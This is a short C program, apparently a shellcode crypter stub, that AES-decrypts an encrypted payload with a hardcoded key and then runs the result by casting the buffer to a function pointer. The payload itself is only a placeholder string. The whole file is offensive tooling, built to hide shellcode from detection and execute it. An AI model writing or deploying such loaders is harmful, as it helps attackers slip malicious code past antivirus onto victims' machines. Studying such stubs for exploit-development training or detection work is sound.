#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include"openssl/aes.h"

main()
{
    AES_KEY aesKey_;
    unsigned char Key[16];
    unsigned char shellcode[16] = {0};
    strcpy((char *) Key,"012345678912345");

    unsigned char ciphertext[] = \
"INSERT ENCODED SHELLCODE HERE";

    AES_set_decrypt_key(Key, 128, &aesKey_);
    AES_decrypt(ciphertext, shellcode,&aesKey_);	  
	
    printf("Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();

}
